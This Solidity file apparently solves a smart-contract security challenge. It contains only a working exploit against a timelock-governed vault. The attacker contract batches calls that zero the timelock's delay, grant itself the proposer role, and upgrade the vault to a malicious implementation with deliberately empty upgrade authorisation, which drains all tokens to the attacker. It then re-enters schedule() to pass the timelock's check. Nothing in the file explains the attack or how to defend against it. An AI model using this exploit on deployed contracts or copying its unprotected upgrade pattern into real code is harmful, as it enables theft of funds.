// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "./ClimberTimelock.sol";

contract NewClimberVault is UUPSUpgradeable {
    function transfer(address recipient, IERC20 token) external {
        token.transfer(recipient, token.balanceOf(address(this)));
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}

contract ClimberAttacker is Ownable {
    ClimberTimelock private immutable timelock;
    address private immutable vault;
    address private immutable token;
    NewClimberVault private immutable newVault;

    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;

    constructor(
        address payable _timelock,
        address _vault,
        address _token
    ) {
        timelock = ClimberTimelock(_timelock);
        vault = _vault;
        token = _token;
        newVault = new NewClimberVault();
    }

    function attack() external {
        // Encode timelock update delay call
        bytes memory timelockData = abi.encodeWithSelector(
            ClimberTimelock.updateDelay.selector,
            uint64(0)
        );

        // Add update delay call to array
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(timelockData);

        // Encode Access control grant role
        bytes memory accessControlData = abi.encodeWithSelector(
            AccessControl.grantRole.selector,
            timelock.PROPOSER_ROLE(),
            address(this)
        );

        // Add grante role call to array
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(accessControlData);

        // Encode transfer call
        bytes memory transferData = abi.encodeWithSelector(
            NewClimberVault.transfer.selector,
            owner(),
            token
        );

        // Encode UUPS upgrade call
        bytes memory vaultData = abi.encodeWithSelector(
            UUPSUpgradeable.upgradeToAndCall.selector,
            address(newVault),
            transferData
        );

        // Add upgrade and call to array
        targets.push(address(vault));
        values.push(0);
        dataElements.push(vaultData);

        // Encode schedule call
        bytes memory scheduleData = abi.encodeWithSelector(
            ClimberAttacker.schedule.selector
        );

        // Add schedule reentrancy call to array
        targets.push(address(this));
        values.push(0);
        dataElements.push(scheduleData);

        // Execute calls in timelock
        timelock.execute(targets, values, dataElements, bytes32(0));
    }

    // Schedule the execute call to be successful
    function schedule() external {
        timelock.schedule(targets, values, dataElements, bytes32(0));
    }
}
